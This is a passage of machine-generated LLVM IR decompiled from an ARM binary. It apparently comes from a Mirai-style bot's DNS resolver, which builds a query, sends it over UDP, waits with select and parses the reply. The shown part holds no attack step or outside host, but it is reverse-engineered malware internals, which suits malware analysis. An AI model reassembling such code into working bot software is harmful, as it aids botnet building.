  %v3_e5e8 = load i32, i32* @r4, align 4
  %v9_e5e8 = load i32, i32* @r6, align 4
  %v12_e5e8 = load i32, i32* @r7, align 4
  %v15_e5e8 = load i32, i32* @r8, align 4
  %v18_e5e8 = load i32, i32* @sb, align 4
  %v21_e5e8 = load i32, i32* @sl, align 4
  %v24_e5e8 = load i32, i32* @fp, align 4
  %v27_e5e8 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_e600 = call i32 @calloc(i32 1, i32 8)
  store i32 %v2_e600, i32* @fp, align 4
  %v0_e608 = load i32, i32* @r5, align 4
  store i32 %v0_e608, i32* %r0.global-to-local, align 4
  %v1_e60c = inttoptr i32 %v0_e608 to i8*
  %v2_e60c = call i32 @util_strlen(i8* %v1_e60c)
  %v2_e614 = ptrtoint i16* %stack_var_-2244 to i32
  store i32 %v2_e614, i32* @sl, align 4
  %v2_e618 = ptrtoint i32* %stack_var_-2232 to i32
  store i32 %v2_e618, i32* @sb, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_e620 = add i32 %v2_e60c, 1
  store i32 %v1_e620, i32* %r0.global-to-local, align 4
  %v2_e624 = ptrtoint i32* %stack_var_-2230 to i32
  store i32 %v2_e624, i32* %r2.global-to-local, align 4
  store i32 %v2_e618, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v1_e620, i32* %r3.global-to-local, align 4
  %v2_e660146 = icmp eq i32 %v1_e620, 0
  store i1 %v2_e660146, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @lr, align 4
  %v1_e668147 = add i32 %v2_e624, -1
  store i32 %v1_e668147, i32* %r1.global-to-local, align 4
  %tmp116148 = icmp slt i32 %v1_e620, 1
  br i1 %tmp116148, label %dec_label_pc_e670, label %dec_label_pc_e634

dec_label_pc_e634:                                ; preds = %entry, %bb115
  %v0_e634151 = phi i32 [ %v1_e654, %bb115 ], [ 0, %entry ]
  %v1_e640150.off0 = phi i8 [ %extract.t152, %bb115 ], [ 0, %entry ]
  %v2_e674149 = phi i32 [ %v1_e658, %bb115 ], [ %v2_e624, %entry ]
  %v1_e634 = load i32, i32* @r5, align 4
  %v2_e634 = add i32 %v1_e634, %v0_e634151
  %v3_e634 = inttoptr i32 %v2_e634 to i8*
  %v4_e634 = load i8, i8* %v3_e634, align 1
  %v6_e634 = zext i8 %v4_e634 to i32
  store i32 %v6_e634, i32* %r3.global-to-local, align 4
  %v2_e638 = icmp eq i8 %v4_e634, 0
  store i1 %v2_e638, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e638, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_e634
  %v8_e63c = icmp eq i8 %v4_e634, 46
  store i1 %v8_e63c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e63c, label %.thread, label %.thread7

.thread:                                          ; preds = %dec_label_pc_e634, %bb
  %v3_e640 = load i32, i32* %r6.global-to-local, align 4
  %v4_e640 = inttoptr i32 %v3_e640 to i8*
  store i8 %v1_e640150.off0, i8* %v4_e640, align 1
  %v0_e644.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e644.pr, label %.thread9.thread13, label %.thread..thread7_crit_edge

.thread..thread7_crit_edge:                       ; preds = %.thread
  %v1_e644.pre = load i32, i32* %r3.global-to-local, align 4
  %v3_e644.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v1_e644.pre to i8
  br label %.thread7

.thread7:                                         ; preds = %.thread..thread7_crit_edge, %bb
  %v3_e644 = phi i32 [ %v3_e644.pre, %.thread..thread7_crit_edge ], [ %v2_e674149, %bb ]
  %v1_e644.off0 = phi i8 [ %extract.t, %.thread..thread7_crit_edge ], [ %v4_e634, %bb ]
  %v4_e644 = add i32 %v3_e644, -1
  %v5_e644 = inttoptr i32 %v4_e644 to i8*
  store i8 %v1_e644.off0, i8* %v5_e644, align 1
  %v0_e648.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e648.pr, label %.thread9, label %.thread12

.thread9.thread13:                                ; preds = %.thread
  %v1_e648 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_e648, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %bb115

.thread9:                                         ; preds = %.thread7
  %v1_e64811 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_e64811, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %bb115

.thread12:                                        ; preds = %.thread7
  %v1_e650 = load i32, i32* @lr, align 4
  %v2_e650 = urem i32 %v1_e650, 256
  store i32 %v2_e650, i32* %r4.global-to-local, align 4
  br label %bb115

bb115:                                            ; preds = %.thread9, %.thread9.thread13, %.thread12
  %v0_e66433 = phi i32 [ 0, %.thread9.thread13 ], [ 0, %.thread9 ], [ %v2_e650, %.thread12 ]
  %v0_e654 = load i32, i32* %ip.global-to-local, align 4
  %v1_e654 = add i32 %v0_e654, 1
  store i32 %v1_e654, i32* %ip.global-to-local, align 4
  %v0_e658 = load i32, i32* %r2.global-to-local, align 4
  %v1_e658 = add i32 %v0_e658, 1
  store i32 %v1_e658, i32* %r2.global-to-local, align 4
  %v1_e65c.pre = load i32, i32* %r0.global-to-local, align 4
  %v2_e65c = sub i32 %v1_e65c.pre, %v1_e654
  store i32 %v2_e65c, i32* %r3.global-to-local, align 4
  %v2_e660 = icmp eq i32 %v2_e65c, 0
  store i1 %v2_e660, i1* %cpsr_z.global-to-local, align 1
  %v1_e664 = add nuw nsw i32 %v0_e66433, 1
  store i32 %v1_e664, i32* @lr, align 4
  store i32 %v0_e658, i32* %r1.global-to-local, align 4
  %tmp116 = icmp slt i32 %v2_e65c, 1
  %extract.t152 = trunc i32 %v0_e66433 to i8
  br i1 %tmp116, label %dec_label_pc_e670, label %dec_label_pc_e634

dec_label_pc_e670:                                ; preds = %bb115, %entry
  %v1_e668.lcssa = phi i32 [ %v1_e668147, %entry ], [ %v0_e658, %bb115 ]
  store i32 0, i32* @r4, align 4
  %v4_e674 = inttoptr i32 %v1_e668.lcssa to i8*
  store i8 0, i8* %v4_e674, align 1
  store i32 %v2_e618, i32* %r0.global-to-local, align 4
  %v1_e67c = bitcast i32* %stack_var_-2232 to i8*
  %v2_e67c = call i32 @util_strlen(i8* %v1_e67c)
  %v2_e680 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_e680, i32* %r1.global-to-local, align 4
  %v1_e684 = load i32, i32* @sb, align 4
  %v2_e684 = add i32 %v1_e684, %v2_e67c
  store i32 %v2_e684, i32* @r5, align 4
  %v0_e68c = load i32, i32* @r4, align 4
  store i32 %v0_e68c, i32* %stack_var_-68, align 4
  store i32 %v2_e618, i32* %r0.global-to-local, align 4
  %v2_e69c = call i32 @util_strlen(i8* %v1_e67c)
  %v1_e6a0 = add i32 %v2_e69c, 17
  store i32 %v1_e6a0, i32* %r0.global-to-local, align 4
  %v0_e6a8 = call i32 @rand_next()
  %v1_e6a8 = sext i32 %v0_e6a8 to i64
  store i32 -2147450879, i32* %r3.global-to-local, align 4
  %v5_e6b4 = mul nuw nsw i64 %v1_e6a8, 2147516417
  %v6_e6b4 = udiv i64 %v5_e6b4, 4294967296
  %v7_e6b4 = trunc i64 %v6_e6b4 to i32
  %v8_e6b4 = trunc i64 %v5_e6b4 to i32
  store i32 %v8_e6b4, i32* @lr, align 4
  store i32 %v7_e6b4, i32* %r2.global-to-local, align 4
  %v5_e6b84 = udiv i64 %v5_e6b4, 140737488355328
  %v5_e6b8 = trunc i64 %v5_e6b84 to i32
  %v6_e6b8 = add i32 %v5_e6b8, %v0_e6a8
  store i32 16, i32* @r1, align 4
  %v6_e6c4 = urem i32 %v6_e6b8, 65536
  store i32 %v6_e6c4, i32* %ip.global-to-local, align 4
  %v2_e6cc = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_e6cc, i32* @r0, align 4
  %v5_e6d0 = trunc i32 %v6_e6b8 to i16
  %v0_e6d4 = call i32 @util_zero()
  store i32 %v0_e6d4, i32* %r0.global-to-local, align 4
  store i32 13568, i32* %ip.global-to-local, align 4
  store i32 2, i32* %stack_var_-68, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  %v0_e704 = load i32, i32* @r5, align 4
  %v1_e704 = add i32 %v0_e704, 1
  store i32 %v1_e704, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i16 %v5_e6d0, i16* %stack_var_-2244, align 2
  %v4_e718 = inttoptr i32 %v1_e704 to i16*
  store i16 256, i16* %v4_e718, align 2
  %v0_e71c = load i32, i32* %r3.global-to-local, align 4
  %v1_e71c = trunc i32 %v0_e71c to i16
  %v2_e71c = load i32, i32* %r2.global-to-local, align 4
  %v3_e71c = add i32 %v2_e71c, 2
  %v4_e71c = inttoptr i32 %v3_e71c to i16*
  store i16 %v1_e71c, i16* %v4_e71c, align 2
  store i32 -1, i32* %r6.global-to-local, align 4
  %v2_e7b4 = ptrtoint i32* %stack_var_-196 to i32
  %v2_e7dc = ptrtoint i32* %stack_var_-40 to i32
  %v2_e808 = ptrtoint i32* %stack_var_-52 to i32
  %v2_e84c = ptrtoint i16* %stack_var_-4292 to i32
  %v2_e8e0 = ptrtoint i32* %stack_var_-4280 to i32
  %v1_e8e8 = bitcast i32* %stack_var_-4280 to i8*
  %v4_e90c = zext i16 %tmp79 to i32
  %v2_e910 = icmp eq i16 %tmp79, 0
  br label %dec_label_pc_e728

dec_label_pc_e728:                                ; preds = %dec_label_pc_e894, %dec_label_pc_e670
  %v1_e72c = phi i32 [ -1, %dec_label_pc_e670 ], [ %v0_e728.pre, %dec_label_pc_e894 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_e670 ], [ %v1_e894, %dec_label_pc_e894 ]
  store i32 %storemerge, i32* @r8, align 4
  %v7_e728 = icmp eq i32 %v1_e72c, -1
  store i1 %v7_e728, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e728, label %bb118, label %bb117

bb117:                                            ; preds = %dec_label_pc_e728
  store i32 %v1_e72c, i32* %r0.global-to-local, align 4
  br label %bb118

bb118:                                            ; preds = %dec_label_pc_e728, %bb117
  store i32 59188, i32* @lr, align 4
  %v1_e730 = xor i1 %v7_e728, true
  call void @__pseudo_cond_branch(i1 %v1_e730, i32 ptrtoint (i32* @global_var_14ab0.112 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* @r1, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e740 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 %v3_e740, i32* %r0.global-to-local, align 4
  %v7_e744 = icmp eq i32 %v3_e740, -1
  store i1 %v7_e744, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_e740, i32* @r6, align 4
  br i1 %v7_e744, label %dec_label_pc_e8d4, label %dec_label_pc_e750

dec_label_pc_e750:                                ; preds = %bb118
  store i32 %v2_e6cc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e75c = call i32 @__libc_connect(i32 %v3_e740, i32 %v2_e6cc, i32 16)
  store i32 %v3_e75c, i32* %r0.global-to-local, align 4
  %v7_e760 = icmp eq i32 %v3_e75c, -1
  store i1 %v7_e760, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e760, label %dec_label_pc_e89c, label %dec_label_pc_e768

dec_label_pc_e768:                                ; preds = %dec_label_pc_e750
  %v0_e768 = load i32, i32* @r6, align 4
  store i32 %v0_e768, i32* %r0.global-to-local, align 4
  store i32 %v2_e614, i32* %r1.global-to-local, align 4
  store i32 %v1_e6a0, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_e778 = call i32 @__libc_send(i32 %v0_e768, i32 %v2_e614, i32 %v1_e6a0, i32 16384)
  store i32 %v4_e778, i32* %r0.global-to-local, align 4
  %v7_e77c = icmp eq i32 %v4_e778, -1
  store i1 %v7_e77c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e77c, label %dec_label_pc_e89c, label %dec_label_pc_e784

dec_label_pc_e784:                                ; preds = %dec_label_pc_e768
  %v0_e784 = load i32, i32* @r6, align 4
  store i32 %v0_e784, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_e790 = call i32 @__libc_fcntl(i32 3, i32 %v0_e784)
  %v0_e794 = load i32, i32* @r6, align 4
  store i32 %v0_e794, i32* %r1.global-to-local, align 4
  %v1_e798 = or i32 %v2_e790, 2048
  store i32 %v1_e798, i32* @r2, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_e7a0 = call i32 @__libc_fcntl(i32 4, i32 %v0_e794)
  store i32 %v2_e7a0, i32* %r0.global-to-local, align 4
  store i32 %v2_e680, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-196, align 4
  store i32 %v2_e7b4, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e7bc

dec_label_pc_e7bc:                                ; preds = %dec_label_pc_e7bc, %dec_label_pc_e784
  %v1_e7c0 = phi i32 [ %v1_e7c4, %dec_label_pc_e7bc ], [ 4, %dec_label_pc_e784 ]
  store i32 0, i32* @r4, align 4
  %v3_e7c0 = add i32 %v1_e7c0, %v2_e7b4
  %v4_e7c0 = inttoptr i32 %v3_e7c0 to i32*
  store i32 0, i32* %v4_e7c0, align 4
  %v0_e7c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_e7c4 = add i32 %v0_e7c4, 4
  store i32 %v1_e7c4, i32* %r3.global-to-local, align 4
  %v7_e7c8 = icmp eq i32 %v1_e7c4, 128
  br i1 %v7_e7c8, label %dec_label_pc_e7d0, label %dec_label_pc_e7bc

dec_label_pc_e7d0:                                ; preds = %dec_label_pc_e7bc
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_e7d0 = load i32, i32* @r6, align 4
  %v3_e7d0 = udiv i32 %v0_e7d0, 32
  %v3_e7d8 = mul nuw nsw i32 %v3_e7d0, 4
  store i32 %v3_e7d8, i32* %r3.global-to-local, align 4
  %v2_e7e0 = add i32 %v3_e7d8, %v2_e7dc
  store i32 %v2_e7e0, i32* @r5, align 4
  %v1_e7e4 = add i32 %v2_e7e0, -156
  %v2_e7e4 = inttoptr i32 %v1_e7e4 to i32*
  %v3_e7e4 = load i32, i32* %v2_e7e4, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_e7ec = urem i32 %v0_e7d0, 32
  store i32 %v1_e7ec, i32* @r7, align 4
  %v7_e7f0 = shl i32 1, %v1_e7ec
  %v8_e7f0 = or i32 %v3_e7e4, %v7_e7f0
  store i32 5, i32* %ip.global-to-local, align 4
  store i32 %v8_e7f0, i32* %v2_e7e4, align 4
  %v0_e800 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_e800, i32* %stack_var_-52, align 4
  store i32 %v2_e808, i32* @lr, align 4
  store i32 %v2_e680, i32* %ip.global-to-local, align 4
  %v0_e810 = load i32, i32* @r6, align 4
  %v1_e810 = load i32, i32* %r3.global-to-local, align 4
  %v2_e810 = add i32 %v1_e810, %v0_e810
  store i32 %v2_e810, i32* %r0.global-to-local, align 4
  %v0_e818 = load i32, i32* @r4, align 4
  store i32 %v0_e818, i32* %r2.global-to-local, align 4
  store i32 %v0_e818, i32* %r3.global-to-local, align 4
  %v5_e824 = call i32 @__libc_select(i32 %v2_e810, i32 %v2_e7b4, i32 %v0_e818, i32 %v0_e818, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_e824, i32* %r0.global-to-local, align 4
  %v7_e828 = icmp eq i32 %v5_e824, -1
  store i1 %v7_e828, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e828, label %dec_label_pc_e8ac, label %dec_label_pc_e830

dec_label_pc_e830:                                ; preds = %dec_label_pc_e7d0
  %v1_e830 = load i32, i32* @r4, align 4
  %v9_e830 = icmp eq i32 %v5_e824, %v1_e830
  store i1 %v9_e830, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e830, label %dec_label_pc_e88c, label %dec_label_pc_e838

dec_label_pc_e838:                                ; preds = %dec_label_pc_e830
  %v0_e838 = load i32, i32* @r5, align 4
  %v1_e838 = add i32 %v0_e838, -156
  %v2_e838 = inttoptr i32 %v1_e838 to i32*
  %v3_e838 = load i32, i32* %v2_e838, align 4
  %v1_e83c = load i32, i32* @r7, align 4
  %v6_e83c = ashr i32 %v3_e838, %v1_e83c
  store i32 %v6_e83c, i32* %r3.global-to-local, align 4
  %v1_e840 = urem i32 %v6_e83c, 2
  %v2_e840 = icmp eq i32 %v1_e840, 0
  store i1 %v2_e840, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e840, label %dec_label_pc_e8ac, label %dec_label_pc_e848

dec_label_pc_e848:                                ; preds = %dec_label_pc_e838
  store i32 %v2_e84c, i32* @r5, align 4
  store i32 %v2_e84c, i32* %r1.global-to-local, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e85c = load i32, i32* @r6, align 4
  store i32 %v0_e85c, i32* %r0.global-to-local, align 4
  %v6_e868 = call i32 @__libc_recvfrom(i32 %v0_e85c, i32 %v2_e84c, i32 2048, i32 16384, i32 %v1_e830, i32 %v1_e830)
  store i32 %v6_e868, i32* %r4.global-to-local, align 4
  %v0_e870 = load i32, i32* @sb, align 4
  store i32 %v0_e870, i32* %r0.global-to-local, align 4
  %v1_e874 = inttoptr i32 %v0_e870 to i8*
  %v2_e874 = call i32 @util_strlen(i8* %v1_e874)
  %v1_e878 = add i32 %v2_e874, 17
  store i32 %v1_e878, i32* %r0.global-to-local, align 4
  %v0_e87c = load i32, i32* %r4.global-to-local, align 4
  %v3_e87c = icmp ult i32 %v0_e87c, %v1_e878
  %v9_e87c = icmp eq i32 %v0_e87c, %v1_e878
  store i1 %v9_e87c, i1* %cpsr_z.global-to-local, align 1
  store i32 -4252, i32* @r4, align 4
  br i1 %v3_e87c, label %dec_label_pc_e88c, label %dec_label_pc_e8e0

dec_label_pc_e88c:                                ; preds = %dec_label_pc_e848, %dec_label_pc_e8e0, %dec_label_pc_e90c, %dec_label_pc_e830, %dec_label_pc_e8d4
  %v0_e88c = load i32, i32* @r8, align 4
  %v7_e88c = icmp eq i32 %v0_e88c, 5
  store i1 %v7_e88c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e88c, label %dec_label_pc_e8ac, label %dec_label_pc_e894

dec_label_pc_e894:                                ; preds = %dec_label_pc_e89c, %dec_label_pc_e88c
  %v0_e894 = phi i32 [ %v0_e8a4, %dec_label_pc_e89c ], [ %v0_e88c, %dec_label_pc_e88c ]
  %v1_e894 = add i32 %v0_e894, 1
  %v0_e728.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e728

dec_label_pc_e89c:                                ; preds = %dec_label_pc_e768, %dec_label_pc_e750
  %v0_e89c = phi i32 [ %v4_e778, %dec_label_pc_e768 ], [ %v3_e75c, %dec_label_pc_e750 ]
  %v1_e89c = add i32 %v0_e89c, 2
  store i32 %v1_e89c, i32* %r0.global-to-local, align 4
  %v1_e8a0 = call i32 @sleep(i32 %v1_e89c)
  store i32 %v1_e8a0, i32* %r0.global-to-local, align 4
  %v0_e8a4 = load i32, i32* @r8, align 4
  %v7_e8a4 = icmp eq i32 %v0_e8a4, 5
  store i1 %v7_e8a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8a4, label %dec_label_pc_e8ac, label %dec_label_pc_e894

dec_label_pc_e8ac:                                ; preds = %dec_label_pc_e89c, %dec_label_pc_e88c, %dec_label_pc_e838, %dec_label_pc_e7d0, %dec_label_pc_e918, %dec_label_pc_e924.backedge
  %v0_e8ac = load i32, i32* @r6, align 4
  store i32 %v0_e8ac, i32* %r0.global-to-local, align 4
  %v1_e8b0 = call i32 @__GI___libc_close(i32 %v0_e8ac)
  store i32 %v1_e8b0, i32* %r0.global-to-local, align 4
  %v0_e8b4 = load i32, i32* @fp, align 4
  %v1_e8b4 = inttoptr i32 %v0_e8b4 to i8*
  %v2_e8b4 = load i8, i8* %v1_e8b4, align 1
  %v3_e8b4 = zext i8 %v2_e8b4 to i32
  store i32 %v3_e8b4, i32* @r4, align 4
  %v2_e8b8 = icmp eq i8 %v2_e8b4, 0
  store i1 %v2_e8b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e8b8, label %dec_label_pc_e9fc, label %dec_label_pc_e8c0

dec_label_pc_e8c0:                                ; preds = %dec_label_pc_e8ac, %dec_label_pc_e9fc
  %v0_e8c0 = phi i32 [ %v0_e8b4, %dec_label_pc_e8ac ], [ %v0_ea10, %dec_label_pc_e9fc ]
  store i32 %v0_e8c0, i32* %r0.global-to-local, align 4
  store i32 %v3_e5e8, i32* @r4, align 4
  store i32 %v9_e5e8, i32* @r6, align 4
  store i32 %v12_e5e8, i32* @r7, align 4
  store i32 %v15_e5e8, i32* @r8, align 4
  store i32 %v18_e5e8, i32* @sb, align 4
  store i32 %v21_e5e8, i32* @sl, align 4
  store i32 %v24_e5e8, i32* @fp, align 4
  store i32 %v27_e5e8, i32* @lr, align 4
  ret i32 %v0_e8c0

dec_label_pc_e8d4:                                ; preds = %bb118
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_e8d8 = call i32 @sleep(i32 1)
  store i32 %v1_e8d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e88c

dec_label_pc_e8e0:                                ; preds = %dec_label_pc_e848
  store i32 %v2_e8e0, i32* @sb, align 4
  store i32 %v2_e8e0, i32* %r0.global-to-local, align 4
  %v2_e8e8 = call i32 @util_strlen(i8* %v1_e8e8)
  store i32 %v2_e7dc, i32* @lr, align 4
  %v4_e8f4 = load i16, i16* %stack_var_-4292, align 2
  %v5_e8f4 = sext i16 %v4_e8f4 to i32
  store i32 %v5_e8f4, i32* %r3.global-to-local, align 4
  store i32 %v6_e6b8, i32* @r1, align 4
  %v1_e8fc = load i32, i32* @sb, align 4
  %v9_e900 = icmp eq i16 %v4_e8f4, %v5_e6d0
  store i1 %v9_e900, i1* %cpsr_z.global-to-local, align 1
  %v2_e8fc = add i32 %v2_e8e8, 5
  %v1_e904 = add i32 %v2_e8fc, %v1_e8fc
  store i32 %v1_e904, i32* %r0.global-to-local, align 4
  br i1 %v9_e900, label %dec_label_pc_e90c, label %dec_label_pc_e88c

dec_label_pc_e90c:                                ; preds = %dec_label_pc_e8e0
  store i32 %v4_e90c, i32* %r3.global-to-local, align 4
  store i1 %v2_e910, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e910, label %dec_label_pc_e88c, label %dec_label_pc_e918

dec_label_pc_e918:                                ; preds = %dec_label_pc_e90c
  %div = udiv i16 %tmp79, 256
  %v3_e918 = zext i16 %div to i32
  store i32 %v3_e918, i32* %r2.global-to-local, align 4
  %v1_e91c = mul nuw nsw i32 %v4_e90c, 256
  %v4_e920 = and i32 %v1_e91c, 65280
  %v5_e920 = or i32 %v4_e920, %v3_e918
  %v1_e924134 = add nsw i32 %v5_e920, -1
  %v3_e928135 = mul i32 %v1_e924134, 65536
  store i32 %v3_e928135, i32* %r3.global-to-local, align 4
  %v7_e92c141 = icmp eq i32 %v3_e928135, -65536
  store i1 %v7_e92c141, i1* %cpsr_z.global-to-local, align 1
  %v3_e930142 = urem i32 %v1_e924134, 65536
  store i32 %v3_e930142, i32* @r8, align 4
  br i1 %v7_e92c141, label %dec_label_pc_e8ac, label %dec_label_pc_e938

dec_label_pc_e938:                                ; preds = %dec_label_pc_e918, %dec_label_pc_e924.backedge
  %v3_e930144 = phi i32 [ %v3_e930, %dec_label_pc_e924.backedge ], [ %v3_e930142, %dec_label_pc_e918 ]
  %v0_e988143 = phi i32 [ %storemerge29, %dec_label_pc_e924.backedge ], [ %v1_e904, %dec_label_pc_e918 ]
  store i32 %v0_e988143, i32* %r3.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v1_e94418 = inttoptr i32 %v0_e988143 to i8*
  %v2_e94419 = load i8, i8* %v1_e94418, align 1
  %v3_e94420 = zext i8 %v2_e94419 to i32
  store i32 %v3_e94420, i32* %r2.global-to-local, align 4
  %v2_e94821 = icmp eq i8 %v2_e94419, 0
  store i1 %v2_e94821, i1* %cpsr_z.global-to-local, align 1
  %v3_e94c22 = mul nuw nsw i32 %v3_e94420, 256
  store i32 %v3_e94c22, i32* @r1, align 4
  br i1 %v2_e94821, label %dec_label_pc_e980, label %dec_label_pc_e954.preheader

dec_label_pc_e954.preheader:                      ; preds = %dec_label_pc_e938, %dec_label_pc_e944.backedge
  %v1_ea20 = phi i32 [ %v1_ea2050, %dec_label_pc_e944.backedge ], [ 1, %dec_label_pc_e938 ]
  %v0_ea1848 = phi i32 [ %v0_ea18, %dec_label_pc_e944.backedge ], [ 0, %dec_label_pc_e938 ]
  %v0_e96046 = phi i32 [ %v3_e94c, %dec_label_pc_e944.backedge ], [ %v3_e94c22, %dec_label_pc_e938 ]
  %v0_e95c44 = phi i32 [ %v1_ea1c, %dec_label_pc_e944.backedge ], [ %v0_e988143, %dec_label_pc_e938 ]
  %v0_e95442 = phi i32 [ %v3_e944, %dec_label_pc_e944.backedge ], [ %v3_e94420, %dec_label_pc_e938 ]
  br label %dec_label_pc_e954

dec_label_pc_e954:                                ; preds = %dec_label_pc_e954.preheader, %dec_label_pc_e95c
  %v0_ea18 = phi i32 [ %v0_ea1848, %dec_label_pc_e954.preheader ], [ 1, %dec_label_pc_e95c ]
  %v0_e960 = phi i32 [ %v0_e96046, %dec_label_pc_e954.preheader ], [ %v3_e978, %dec_label_pc_e95c ]
  %v0_ea1c = phi i32 [ %v0_e95c44, %dec_label_pc_e954.preheader ], [ %v2_e968, %dec_label_pc_e95c ]
  %v0_e954 = phi i32 [ %v0_e95442, %dec_label_pc_e954.preheader ], [ %v3_e96c, %dec_label_pc_e95c ]
  %v7_e954 = icmp eq i32 %v0_e954, 191
  store i1 %v7_e954, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v0_e954, 192
  br i1 %tmp, label %dec_label_pc_ea18, label %dec_label_pc_e95c

dec_label_pc_e95c:                                ; preds = %dec_label_pc_e954
  %v1_e95c = add i32 %v0_ea1c, 1
  %v2_e95c = inttoptr i32 %v1_e95c to i8*
  %v3_e95c = load i8, i8* %v2_e95c, align 1
  %v4_e95c = zext i8 %v3_e95c to i32
  %v2_e960 = or i32 %v4_e95c, -49152
  %v0_e968 = load i32, i32* @r5, align 4
  %v1_e964 = add i32 %v0_e968, %v0_e960
  %v2_e968 = add i32 %v1_e964, %v2_e960
  store i32 %v2_e968, i32* %r3.global-to-local, align 4
  %v1_e96c = inttoptr i32 %v2_e968 to i8*
  %v2_e96c = load i8, i8* %v1_e96c, align 1
  %v3_e96c = zext i8 %v2_e96c to i32
  store i32 %v3_e96c, i32* %r2.global-to-local, align 4
  %v2_e970 = icmp eq i8 %v2_e96c, 0
  store i1 %v2_e970, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @lr, align 4
  %v3_e978 = mul nuw nsw i32 %v3_e96c, 256
  store i32 %v3_e978, i32* @r1, align 4
  br i1 %v2_e970, label %dec_label_pc_e980, label %dec_label_pc_e954

dec_label_pc_e980:                                ; preds = %dec_label_pc_e944.backedge, %dec_label_pc_e95c, %dec_label_pc_e938
  %v1_e984 = phi i32 [ 1, %dec_label_pc_e938 ], [ %v1_ea20, %dec_label_pc_e95c ], [ %v1_ea2050, %dec_label_pc_e944.backedge ]
  %v0_e980 = phi i32 [ 0, %dec_label_pc_e938 ], [ 1, %dec_label_pc_e95c ], [ %v0_ea18, %dec_label_pc_e944.backedge ]
  %v7_e980 = icmp eq i32 %v0_e980, 1
  store i1 %v7_e980, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e980, label %bb119, label %bb120

bb119:                                            ; preds = %dec_label_pc_e980
  %v2_e984 = add i32 %v1_e984, 1
  store i32 %v2_e984, i32* %ip.global-to-local, align 4
  br label %bb120

bb120:                                            ; preds = %dec_label_pc_e980, %bb119
  %v1_e988 = phi i32 [ %v1_e984, %dec_label_pc_e980 ], [ %v2_e984, %bb119 ]
  %v2_e988 = add i32 %v1_e988, %v0_e988143
  store i32 %v2_e988, i32* @r4, align 4
  %v3_e98c = inttoptr i32 %v2_e988 to i8*
  %v4_e98c = load i8, i8* %v3_e98c, align 1
  %v6_e98c = zext i8 %v4_e98c to i32
  store i32 %v6_e98c, i32* %r3.global-to-local, align 4
  %v1_e990 = add i32 %v2_e988, 1
  %v2_e990 = inttoptr i32 %v1_e990 to i8*
  %v3_e990 = load i8, i8* %v2_e990, align 1
  %v4_e990 = zext i8 %v3_e990 to i32
  store i32 %v4_e990, i32* %r2.global-to-local, align 4
  %v4_e994 = mul nuw nsw i32 %v4_e990, 256
  %v5_e994 = or i32 %v4_e994, %v6_e98c
  store i32 %v5_e994, i32* %r3.global-to-local, align 4
  %v7_e998 = icmp eq i32 %v5_e994, 256
  store i1 %v7_e998, i1* %cpsr_z.global-to-local, align 1
  %v1_e99c = add i32 %v2_e988, 10
  store i32 %v1_e99c, i32* @r7, align 4
  br i1 %v7_e998, label %dec_label_pc_ea38, label %dec_label_pc_e9a4

dec_label_pc_e9a4:                                ; preds = %dec_label_pc_ea38, %bb120
  store i32 %v1_e99c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
